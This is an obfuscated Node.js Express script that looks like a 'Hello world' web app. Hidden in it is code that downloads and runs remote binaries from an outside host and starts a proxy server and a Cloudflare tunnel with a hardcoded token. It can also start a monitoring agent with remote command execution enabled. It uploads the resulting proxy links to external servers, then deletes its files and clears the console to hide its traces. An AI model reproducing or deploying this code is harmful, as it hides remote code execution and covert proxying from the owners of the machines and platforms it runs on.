const _0x2b954d=_0x2b0e;(function(_0x1aa0a8,_0x502f3e){const _0x18e82f=_0x2b0e,_0x40c2d7=_0x1aa0a8();while(!![]){try{const _0x173b9e=parseInt(_0x18e82f(0x10e))/0x1*(-parseInt(_0x18e82f(0x88))/0x2)+-parseInt(_0x18e82f(0x85))/0x3*(-parseInt(_0x18e82f(0xca))/0x4)+parseInt(_0x18e82f(0x8b))/0x5*(-parseInt(_0x18e82f(0xfa))/0x6)+parseInt(_0x18e82f(0x7b))/0x7+parseInt(_0x18e82f(0xcb))/0x8+-parseInt(_0x18e82f(0xc3))/0x9+parseInt(_0x18e82f(0x12a))/0xa*(parseInt(_0x18e82f(0x99))/0xb);if(_0x173b9e===_0x502f3e)break;else _0x40c2d7['push'](_0x40c2d7['shift']());}catch(_0x55d35f){_0x40c2d7['push'](_0x40c2d7['shift']());}}}(_0x2d56,0x3733e));const express=require(_0x2b954d(0x12d)),app=express(),axios=require(_0x2b954d(0xe3)),os=require('os'),fs=require('fs'),path=require(_0x2b954d(0xda)),{promisify}=require(_0x2b954d(0x9e)),exec=promisify(require('child_process')[_0x2b954d(0x83)]),{execSync}=require(_0x2b954d(0x92)),UPLOAD_URL=process[_0x2b954d(0xa9)][_0x2b954d(0xbb)]||'',PROJECT_URL=process[_0x2b954d(0xa9)][_0x2b954d(0x94)]||'',AUTO_ACCESS=process[_0x2b954d(0xa9)][_0x2b954d(0xd5)]||![],FILE_PATH=process['env'][_0x2b954d(0x123)]||_0x2b954d(0x12f),SUB_PATH=process['env'][_0x2b954d(0xdf)]||'kv',PORT=process[_0x2b954d(0xa9)][_0x2b954d(0xe4)]||process[_0x2b954d(0xa9)][_0x2b954d(0x81)]||0xbb8,UUID=process[_0x2b954d(0xa9)][_0x2b954d(0x10c)]||_0x2b954d(0x13b),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2b954d(0xa9)][_0x2b954d(0xc7)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2b954d(0xa9)][_0x2b954d(0x11c)]||_0x2b954d(0xaa),ARGO_AUTH=process[_0x2b954d(0xa9)][_0x2b954d(0xe1)]||'eyJhIjoiOWViNDNkM2M3ZmYyYzM5YzZhYzM1ZjVkNzA5ZTE5ZmEiLCJ0IjoiYjZkYTM0ZDMtMzliOC00Y2QyLWFjMTQtMjZiNWI0NWI3ODUxIiwicyI6Ik1UQmpaakZtWkRJdFpHWm1PUzAwWmpjMkxUa3pPR0V0WWpCaVpqWTJNek13TldOaiJ9',ARGO_PORT=process[_0x2b954d(0xa9)][_0x2b954d(0xd4)]||0x1f41,CFIP=process[_0x2b954d(0xa9)][_0x2b954d(0x8d)]||_0x2b954d(0xfc),CFPORT=process[_0x2b954d(0xa9)][_0x2b954d(0xb2)]||0x1bb,NAME=process[_0x2b954d(0xa9)][_0x2b954d(0xea)]||'KV';!fs[_0x2b954d(0x131)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2b954d(0x11d)](FILE_PATH+_0x2b954d(0x107))):console[_0x2b954d(0x11d)](FILE_PATH+_0x2b954d(0x136));function generateRandomName(){const _0x4d07f0=_0x2b954d,_0xf89463=_0x4d07f0(0x96);let _0x1b5d46='';for(let _0x4f8154=0x0;_0x4f8154<0x6;_0x4f8154++){_0x1b5d46+=_0xf89463[_0x4d07f0(0x128)](Math[_0x4d07f0(0xeb)](Math[_0x4d07f0(0x90)]()*_0xf89463[_0x4d07f0(0x115)]));}return _0x1b5d46;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2b954d(0xe7)](FILE_PATH,npmName),phpPath=path[_0x2b954d(0xe7)](FILE_PATH,phpName),webPath=path[_0x2b954d(0xe7)](FILE_PATH,webName),botPath=path[_0x2b954d(0xe7)](FILE_PATH,botName),subPath=path[_0x2b954d(0xe7)](FILE_PATH,'sub.txt'),listPath=path[_0x2b954d(0xe7)](FILE_PATH,_0x2b954d(0x110)),bootLogPath=path['join'](FILE_PATH,_0x2b954d(0xf7)),configPath=path[_0x2b954d(0xe7)](FILE_PATH,'config.json');function deleteNodes(){const _0x52fe9d=_0x2b954d;try{if(!UPLOAD_URL)return;if(!fs[_0x52fe9d(0x131)](subPath))return;let _0xa59fb8;try{_0xa59fb8=fs['readFileSync'](subPath,_0x52fe9d(0x125));}catch{return null;}const _0xe8678f=Buffer[_0x52fe9d(0xaf)](_0xa59fb8,_0x52fe9d(0x135))[_0x52fe9d(0x119)](_0x52fe9d(0x125)),_0x4ae384=_0xe8678f[_0x52fe9d(0x97)]('\x0a')[_0x52fe9d(0xf3)](_0x30fe4f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x52fe9d(0x12b)](_0x30fe4f));if(_0x4ae384[_0x52fe9d(0x115)]===0x0)return;return axios[_0x52fe9d(0xcc)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x52fe9d(0xff)]({'nodes':_0x4ae384}),{'headers':{'Content-Type':_0x52fe9d(0xcd)}})[_0x52fe9d(0xb6)](_0x3e65d6=>{return null;}),null;}catch(_0x31d87f){return null;}}function cleanupOldFiles(){const _0xb2d66b=_0x2b954d;try{const _0x3c525e=fs['readdirSync'](FILE_PATH);_0x3c525e[_0xb2d66b(0x121)](_0x443db9=>{const _0x37c973=_0xb2d66b,_0x60cb4e=path['join'](FILE_PATH,_0x443db9);try{const _0x2bc9f9=fs['statSync'](_0x60cb4e);_0x2bc9f9[_0x37c973(0xec)]()&&fs[_0x37c973(0x111)](_0x60cb4e);}catch(_0x3b672e){}});}catch(_0x35b65d){}}app[_0x2b954d(0xf1)]('/',function(_0x965d97,_0x1c1198){const _0x49e9e8=_0x2b954d;_0x1c1198[_0x49e9e8(0xef)](_0x49e9e8(0xde));});async function generateConfig(){const _0xe6608b=_0x2b954d,_0x10d28a={'log':{'access':_0xe6608b(0xe0),'error':_0xe6608b(0xe0),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0xe6608b(0xe8),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0xe6608b(0xba),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0xe6608b(0xc1),'dest':0xbbb},{'path':_0xe6608b(0x93),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0xe6608b(0xe8),'settings':{'clients':[{'id':UUID}],'decryption':_0xe6608b(0xba)},'streamSettings':{'network':_0xe6608b(0xa4),'security':_0xe6608b(0xba)}},{'port':0xbba,'listen':_0xe6608b(0x98),'protocol':_0xe6608b(0xe8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0xe6608b(0xba)},'streamSettings':{'network':'ws','security':_0xe6608b(0xba),'wsSettings':{'path':_0xe6608b(0xfe)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0xe6608b(0x106)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0xe6608b(0x98),'protocol':_0xe6608b(0xa1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0xe6608b(0xc1)}},'sniffing':{'enabled':!![],'destOverride':[_0xe6608b(0x8c),_0xe6608b(0xd7),_0xe6608b(0x106)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0xe6608b(0x98),'protocol':_0xe6608b(0x118),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0xe6608b(0xba),'wsSettings':{'path':_0xe6608b(0x93)}},'sniffing':{'enabled':!![],'destOverride':['http',_0xe6608b(0xd7),_0xe6608b(0x106)],'metadataOnly':![]}}],'dns':{'servers':[_0xe6608b(0x124)]},'outbounds':[{'protocol':_0xe6608b(0x9f),'tag':_0xe6608b(0x129)},{'protocol':'blackhole','tag':'block'}]};fs[_0xe6608b(0xd3)](path[_0xe6608b(0xe7)](FILE_PATH,_0xe6608b(0x105)),JSON[_0xe6608b(0xff)](_0x10d28a,null,0x2));}function getSystemArchitecture(){const _0x18ff6b=_0x2b954d,_0x23fb8a=os[_0x18ff6b(0xe5)]();return _0x23fb8a===_0x18ff6b(0x89)||_0x23fb8a===_0x18ff6b(0x82)||_0x23fb8a===_0x18ff6b(0xdc)?_0x18ff6b(0x89):_0x18ff6b(0x7c);}function downloadFile(_0x43b739,_0x1a8f31,_0xce0725){const _0x497187=_0x2b954d,_0x11f730=_0x43b739;!fs['existsSync'](FILE_PATH)&&fs[_0x497187(0xb5)](FILE_PATH,{'recursive':!![]});const _0x3bac97=fs[_0x497187(0x12e)](_0x11f730);axios({'method':'get','url':_0x1a8f31,'responseType':_0x497187(0x8f)})['then'](_0x3fca1b=>{const _0x25727c=_0x497187;_0x3fca1b[_0x25727c(0x84)]['pipe'](_0x3bac97),_0x3bac97['on']('finish',()=>{const _0x217289=_0x25727c;_0x3bac97[_0x217289(0xc2)](),console[_0x217289(0x11d)]('Download\x20'+path[_0x217289(0x137)](_0x11f730)+_0x217289(0xdd)),_0xce0725(null,_0x11f730);}),_0x3bac97['on'](_0x25727c(0xc8),_0x437a57=>{const _0x5a1c69=_0x25727c;fs[_0x5a1c69(0xa6)](_0x11f730,()=>{});const _0x111d49=_0x5a1c69(0xfd)+path['basename'](_0x11f730)+_0x5a1c69(0xa7)+_0x437a57[_0x5a1c69(0x120)];console[_0x5a1c69(0xc8)](_0x111d49),_0xce0725(_0x111d49);});})['catch'](_0x27e146=>{const _0x5ecf4f=_0x497187,_0x815661=_0x5ecf4f(0xfd)+path[_0x5ecf4f(0x137)](_0x11f730)+'\x20failed:\x20'+_0x27e146[_0x5ecf4f(0x120)];console[_0x5ecf4f(0xc8)](_0x815661),_0xce0725(_0x815661);});}async function downloadFilesAndRun(){const _0x5aa14c=_0x2b954d,_0x3c2bea=getSystemArchitecture(),_0x249e4a=getFilesForArchitecture(_0x3c2bea);if(_0x249e4a['length']===0x0){console[_0x5aa14c(0x11d)](_0x5aa14c(0x80));return;}const _0x32afdf=_0x249e4a['map'](_0x421ca9=>{return new Promise((_0x27a2f5,_0x618054)=>{const _0xd5660b=_0x2b0e;downloadFile(_0x421ca9['fileName'],_0x421ca9[_0xd5660b(0xe6)],(_0x17ca5c,_0x56d106)=>{_0x17ca5c?_0x618054(_0x17ca5c):_0x27a2f5(_0x56d106);});});});try{await Promise['all'](_0x32afdf);}catch(_0x29f6ee){console[_0x5aa14c(0xc8)]('Error\x20downloading\x20files:',_0x29f6ee);return;}function _0x427e9(_0x21cd7c){const _0x50c3ca=_0x5aa14c,_0x1f07cd=0x1fd;_0x21cd7c[_0x50c3ca(0x121)](_0x360993=>{const _0x8254f4=_0x50c3ca;fs[_0x8254f4(0x131)](_0x360993)&&fs[_0x8254f4(0xa0)](_0x360993,_0x1f07cd,_0x58c89c=>{const _0x35baf0=_0x8254f4;_0x58c89c?console[_0x35baf0(0xc8)](_0x35baf0(0x108)+_0x360993+':\x20'+_0x58c89c):console[_0x35baf0(0x11d)]('Empowerment\x20success\x20for\x20'+_0x360993+':\x20'+_0x1f07cd[_0x35baf0(0x119)](0x8));});});}const _0x4f18d4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x427e9(_0x4f18d4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x20f062=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x5aa14c(0xf6)]():'',_0x4e9e72=new Set([_0x5aa14c(0xc5),_0x5aa14c(0xae),'2096',_0x5aa14c(0x11b),'2083',_0x5aa14c(0x87)]),_0x4499ec=_0x4e9e72[_0x5aa14c(0x100)](_0x20f062)?_0x5aa14c(0x126):'false',_0x423298=_0x5aa14c(0x95)+NEZHA_KEY+_0x5aa14c(0xc0)+NEZHA_SERVER+_0x5aa14c(0x9c)+_0x4499ec+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x5aa14c(0xe7)](FILE_PATH,_0x5aa14c(0xdb)),_0x423298);const _0x1910e5=_0x5aa14c(0xf5)+phpPath+_0x5aa14c(0xf9)+FILE_PATH+_0x5aa14c(0x7d);try{await exec(_0x1910e5),console[_0x5aa14c(0x11d)](phpName+_0x5aa14c(0x139)),await new Promise(_0x349f0c=>setTimeout(_0x349f0c,0x3e8));}catch(_0xadd651){console[_0x5aa14c(0xc8)](_0x5aa14c(0xce)+_0xadd651);}}else{let _0x51f0b8='';const _0xecef7a=[_0x5aa14c(0xc5),'8443',_0x5aa14c(0x133),'2087',_0x5aa14c(0xb7),_0x5aa14c(0x87)];_0xecef7a[_0x5aa14c(0xd8)](NEZHA_PORT)&&(_0x51f0b8=_0x5aa14c(0xad));const _0x80af8a=_0x5aa14c(0xf5)+npmPath+_0x5aa14c(0x91)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x51f0b8+_0x5aa14c(0xee);try{await exec(_0x80af8a),console[_0x5aa14c(0x11d)](npmName+_0x5aa14c(0x139)),await new Promise(_0x40103b=>setTimeout(_0x40103b,0x3e8));}catch(_0xbc4ae7){console['error'](_0x5aa14c(0xbd)+_0xbc4ae7);}}}else console[_0x5aa14c(0x11d)](_0x5aa14c(0xac));const _0x5885b8='nohup\x20'+webPath+_0x5aa14c(0x7e)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5885b8),console[_0x5aa14c(0x11d)](webName+_0x5aa14c(0x139)),await new Promise(_0x414567=>setTimeout(_0x414567,0x3e8));}catch(_0x434079){console[_0x5aa14c(0xc8)]('web\x20running\x20error:\x20'+_0x434079);}if(fs[_0x5aa14c(0x131)](botPath)){let _0x5c73e0;if(ARGO_AUTH[_0x5aa14c(0x9a)](/^[A-Z0-9a-z=]{120,250}$/))_0x5c73e0=_0x5aa14c(0xf8)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x5c73e0=_0x5aa14c(0xd0)+FILE_PATH+_0x5aa14c(0x130):_0x5c73e0=_0x5aa14c(0x10b)+FILE_PATH+_0x5aa14c(0xa5)+ARGO_PORT;try{await exec(_0x5aa14c(0xf5)+botPath+'\x20'+_0x5c73e0+_0x5aa14c(0x112)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x4666a2=>setTimeout(_0x4666a2,0x7d0));}catch(_0x2e40fd){console[_0x5aa14c(0xc8)](_0x5aa14c(0x9d)+_0x2e40fd);}}await new Promise(_0x2ebc21=>setTimeout(_0x2ebc21,0x1388));}function getFilesForArchitecture(_0x535b9f){const _0x419643=_0x2b954d;let _0x429c35;_0x535b9f===_0x419643(0x89)?_0x429c35=[{'fileName':webPath,'fileUrl':_0x419643(0xed)},{'fileName':botPath,'fileUrl':_0x419643(0x138)}]:_0x429c35=[{'fileName':webPath,'fileUrl':_0x419643(0x86)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xa82126=_0x535b9f===_0x419643(0x89)?_0x419643(0x127):'https://amd64.ssss.nyc.mn/agent';_0x429c35[_0x419643(0xcf)]({'fileName':npmPath,'fileUrl':_0xa82126});}else{const _0xc2222f=_0x535b9f==='arm'?_0x419643(0x10a):_0x419643(0xe2);_0x429c35[_0x419643(0xcf)]({'fileName':phpPath,'fileUrl':_0xc2222f});}}return _0x429c35;}function argoType(){const _0x10fe5a=_0x2b954d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x10fe5a(0x11d)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x10fe5a(0xd8)]('TunnelSecret')){fs[_0x10fe5a(0xd3)](path[_0x10fe5a(0xe7)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x7e1c1a='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x10fe5a(0xb8)+path[_0x10fe5a(0xe7)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x10fe5a(0x8e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x10fe5a(0xd3)](path[_0x10fe5a(0xe7)](FILE_PATH,_0x10fe5a(0xd1)),_0x7e1c1a);}else console[_0x10fe5a(0x11d)](_0x10fe5a(0xa2));}argoType();async function extractDomains(){const _0x2f6100=_0x2b954d;let _0x30de78;if(ARGO_AUTH&&ARGO_DOMAIN)_0x30de78=ARGO_DOMAIN,console[_0x2f6100(0x11d)](_0x2f6100(0x132),_0x30de78),await _0x590819(_0x30de78);else try{const _0x346bfc=fs[_0x2f6100(0xfb)](path['join'](FILE_PATH,_0x2f6100(0xf7)),_0x2f6100(0x125)),_0x417224=_0x346bfc[_0x2f6100(0x97)]('\x0a'),_0x4ee61e=[];_0x417224[_0x2f6100(0x121)](_0x26295b=>{const _0x2cff10=_0x2f6100,_0x5cc26d=_0x26295b[_0x2cff10(0x9a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5cc26d){const _0xa5f0e4=_0x5cc26d[0x1];_0x4ee61e[_0x2cff10(0x104)](_0xa5f0e4);}});if(_0x4ee61e[_0x2f6100(0x115)]>0x0)_0x30de78=_0x4ee61e[0x0],console[_0x2f6100(0x11d)](_0x2f6100(0xc6),_0x30de78),await _0x590819(_0x30de78);else{console[_0x2f6100(0x11d)](_0x2f6100(0x7f)),fs[_0x2f6100(0x111)](path['join'](FILE_PATH,_0x2f6100(0xf7)));async function _0x5ef5ba(){const _0x5507bf=_0x2f6100;try{process[_0x5507bf(0xb1)]===_0x5507bf(0x101)?await exec(_0x5507bf(0xab)+botName+_0x5507bf(0xb0)):await exec('pkill\x20-f\x20\x22['+botName[_0x5507bf(0x128)](0x0)+']'+botName['substring'](0x1)+_0x5507bf(0x11a));}catch(_0x3fbfb8){}}_0x5ef5ba(),await new Promise(_0x1a0d27=>setTimeout(_0x1a0d27,0xbb8));const _0x1518f5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2f6100(0xa5)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1518f5+_0x2f6100(0x112)),console[_0x2f6100(0x11d)](botName+_0x2f6100(0x139)),await new Promise(_0x4faf4b=>setTimeout(_0x4faf4b,0xbb8)),await extractDomains();}catch(_0x42d30e){console[_0x2f6100(0xc8)](_0x2f6100(0x9d)+_0x42d30e);}}}catch(_0x11b88f){console[_0x2f6100(0xc8)](_0x2f6100(0x116),_0x11b88f);}async function _0x590819(_0xe3c5f9){const _0x474d76=_0x2f6100,_0x35ca19=execSync(_0x474d76(0xd9),{'encoding':'utf-8'}),_0x3e3630=_0x35ca19[_0x474d76(0x134)](),_0x47db89=NAME?NAME+'-'+_0x3e3630:_0x3e3630;return new Promise(_0x1ada1f=>{setTimeout(()=>{const _0x5766fe=_0x2b0e,_0x346187={'v':'2','ps':''+_0x47db89,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5766fe(0xba),'net':'ws','type':_0x5766fe(0xba),'host':_0xe3c5f9,'path':'/vmess-argo?ed=2560','tls':_0x5766fe(0xd7),'sni':_0xe3c5f9,'alpn':'','fp':_0x5766fe(0x113)},_0x228c35=_0x5766fe(0xe9)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0xe3c5f9+_0x5766fe(0x117)+_0xe3c5f9+_0x5766fe(0xbf)+_0x47db89+_0x5766fe(0x11e)+Buffer[_0x5766fe(0xaf)](JSON[_0x5766fe(0xff)](_0x346187))['toString'](_0x5766fe(0x135))+_0x5766fe(0x114)+UUID+'@'+CFIP+':'+CFPORT+_0x5766fe(0xd2)+_0xe3c5f9+'&fp=firefox&type=ws&host='+_0xe3c5f9+_0x5766fe(0xb4)+_0x47db89+_0x5766fe(0x12c);console['log'](Buffer[_0x5766fe(0xaf)](_0x228c35)[_0x5766fe(0x119)](_0x5766fe(0x135))),fs[_0x5766fe(0xd3)](subPath,Buffer[_0x5766fe(0xaf)](_0x228c35)['toString']('base64')),console[_0x5766fe(0x11d)](FILE_PATH+_0x5766fe(0xd6)),uploadNodes(),app[_0x5766fe(0xf1)]('/'+SUB_PATH,(_0x4dc921,_0x475e37)=>{const _0x2b6875=_0x5766fe,_0x1b0144=Buffer[_0x2b6875(0xaf)](_0x228c35)[_0x2b6875(0x119)](_0x2b6875(0x135));_0x475e37[_0x2b6875(0xc9)](_0x2b6875(0xb9),_0x2b6875(0xbe)),_0x475e37[_0x2b6875(0xef)](_0x1b0144);}),_0x1ada1f(_0x228c35);},0x7d0);});}}async function uploadNodes(){const _0x47223d=_0x2b954d;if(UPLOAD_URL&&PROJECT_URL){const _0x1b50c7=PROJECT_URL+'/'+SUB_PATH,_0x903c23={'subscription':[_0x1b50c7]};try{const _0x34e082=await axios[_0x47223d(0xcc)](UPLOAD_URL+_0x47223d(0xf4),_0x903c23,{'headers':{'Content-Type':_0x47223d(0xcd)}});return _0x34e082&&_0x34e082[_0x47223d(0xa3)]===0xc8?(console[_0x47223d(0x11d)](_0x47223d(0x9b)),_0x34e082):null;}catch(_0x46173f){if(_0x46173f[_0x47223d(0xbc)]){if(_0x46173f[_0x47223d(0xbc)][_0x47223d(0xa3)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x47223d(0x131)](listPath))return;const _0x49f597=fs[_0x47223d(0xfb)](listPath,'utf-8'),_0x580836=_0x49f597[_0x47223d(0x97)]('\x0a')[_0x47223d(0xf3)](_0x81bff=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x47223d(0x12b)](_0x81bff));if(_0x580836['length']===0x0)return;const _0x331e3a=JSON['stringify']({'nodes':_0x580836});try{const _0xa4eade=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x331e3a,{'headers':{'Content-Type':'application/json'}});return _0xa4eade&&_0xa4eade[_0x47223d(0xa3)]===0xc8?(console[_0x47223d(0x11d)](_0x47223d(0x103)),_0xa4eade):null;}catch(_0x399d92){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5b1f4e=_0x2b0e,_0x50f8b0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x50f8b0[_0x5b1f4e(0x104)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x50f8b0[_0x5b1f4e(0x104)](phpPath);process[_0x5b1f4e(0xb1)]===_0x5b1f4e(0x101)?exec('del\x20/f\x20/q\x20'+_0x50f8b0[_0x5b1f4e(0xe7)]('\x20')+_0x5b1f4e(0x8a),_0xade4fd=>{const _0xf3daf0=_0x5b1f4e;console[_0xf3daf0(0xf2)](),console[_0xf3daf0(0x11d)](_0xf3daf0(0xb3)),console[_0xf3daf0(0x11d)](_0xf3daf0(0x10f));}):exec(_0x5b1f4e(0x109)+_0x50f8b0[_0x5b1f4e(0xe7)]('\x20')+_0x5b1f4e(0x102),_0x497db7=>{const _0x4717dd=_0x5b1f4e;console[_0x4717dd(0xf2)](),console[_0x4717dd(0x11d)](_0x4717dd(0xb3)),console[_0x4717dd(0x11d)](_0x4717dd(0x10f));});},0x15f90);}cleanFiles();function _0x2d56(){const _0x283e0a=['\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','send','Error\x20in\x20startserver:','get','clear','filter','/api/add-subscriptions','nohup\x20','pop','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20-c\x20\x22','762468YjYzTn','readFileSync','cdns.doon.eu.org','Download\x20','/vless-argo','stringify','has','win32','\x20>/dev/null\x202>&1','Nodes\x20uploaded\x20successfully','push','config.json','quic','\x20is\x20created','Empowerment\x20failed\x20for\x20','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','UUID','listen','9HepFJJ','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','list.txt','unlinkSync','\x20>/dev/null\x202>&1\x20&','firefox','\x0a\x20\x20\x0atrojan://','length','Error\x20reading\x20boot.log:','&fp=firefox&type=ws&host=','trojan','toString','\x22\x20>\x20/dev/null\x202>&1','2087','ARGO_DOMAIN','log','\x0a\x20\x20\x0avmess://','Unhandled\x20error\x20in\x20startserver:','message','forEach','https://oooo.serv00.net/add-url','FILE_PATH','https+local://8.8.8.8/dns-query','utf-8','true','https://arm64.ssss.nyc.mn/agent','charAt','direct','2314810ZfAbkz','test','\x0a\x20\x20\x20\x20','express','createWriteStream','./tmp','/tunnel.yml\x20run','existsSync','ARGO_DOMAIN:','2096','trim','base64','\x20already\x20exists','basename','https://arm64.ssss.nyc.mn/bot','\x20is\x20running','http\x20server\x20is\x20running\x20on\x20port:','69af256b-57ce-42f2-8d2c-6f7e9f1ee851','1606584DUJoJz','amd','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-c\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','PORT','arm64','exec','data','2412nOToxU','https://amd64.ssss.nyc.mn/web','2053','7218thsiLc','arm','\x20>\x20nul\x202>&1','15IsVdVJ','http','CFIP','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','stream','random','\x20-s\x20','child_process','/trojan-argo','PROJECT_URL','\x0aclient_secret:\x20','abcdefghijklmnopqrstuvwxyz','split','127.0.0.1','11MSeCXp','match','Subscription\x20uploaded\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Error\x20executing\x20command:\x20','util','freedom','chmod','vmess','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','status','tcp','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlink','\x20failed:\x20','Skipping\x20adding\x20automatic\x20access\x20task','env','sub.alina9561.netlib.re','taskkill\x20/f\x20/im\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','--tls','8443','from','.exe\x20>\x20nul\x202>&1','platform','CFPORT','App\x20is\x20running','&path=%2Ftrojan-argo%3Fed%3D2560#','mkdirSync','catch','2083','\x0a\x20\x20credentials-file:\x20','Content-Type','none','UPLOAD_URL','response','npm\x20running\x20error:\x20','text/plain;\x20charset=utf-8','&path=%2Fvless-argo%3Fed%3D2560#','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/vmess-argo','close','3697038olfhMt','Add\x20automatic\x20access\x20task\x20faild:\x20','443','ArgoDomain:','NEZHA_PORT','error','set','2248BglZna','1102128WCfrNW','post','application/json','php\x20running\x20error:\x20','unshift','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.yml','?security=tls&sni=','writeFileSync','ARGO_PORT','AUTO_ACCESS','/sub.txt\x20saved\x20successfully','tls','includes','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','path','config.yaml','aarch64','\x20successfully','Hello\x20world!','SUB_PATH','/dev/null','ARGO_AUTH','https://amd64.ssss.nyc.mn/v1','axios','SERVER_PORT','arch','fileUrl','join','vless','\x0avless://','NAME','floor','isFile','https://arm64.ssss.nyc.mn/web'];_0x2d56=function(){return _0x283e0a;};return _0x2d56();}async function AddVisitTask(){const _0x2b1194=_0x2b954d;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2b1194(0xa8));return;}try{const _0x47aa21=await axios[_0x2b1194(0xcc)](_0x2b1194(0x122),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2b1194(0x11d)]('automatic\x20access\x20task\x20added\x20successfully'),_0x47aa21;}catch(_0x2e5c0d){return console[_0x2b1194(0xc8)](_0x2b1194(0xc4)+_0x2e5c0d[_0x2b1194(0x120)]),null;}}function _0x2b0e(_0x1d2fbc,_0x49ad8d){const _0x2d560c=_0x2d56();return _0x2b0e=function(_0x2b0e7c,_0x469d13){_0x2b0e7c=_0x2b0e7c-0x7b;let _0x3c818c=_0x2d560c[_0x2b0e7c];return _0x3c818c;},_0x2b0e(_0x1d2fbc,_0x49ad8d);}async function startserver(){const _0x34b044=_0x2b954d;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x51eede){console['error'](_0x34b044(0xf0),_0x51eede);}}startserver()[_0x2b954d(0xb6)](_0x2a53d=>{const _0x4afbf9=_0x2b954d;console[_0x4afbf9(0xc8)](_0x4afbf9(0x11f),_0x2a53d);}),app[_0x2b954d(0x10d)](PORT,()=>console[_0x2b954d(0x11d)](_0x2b954d(0x13a)+PORT+'!'));
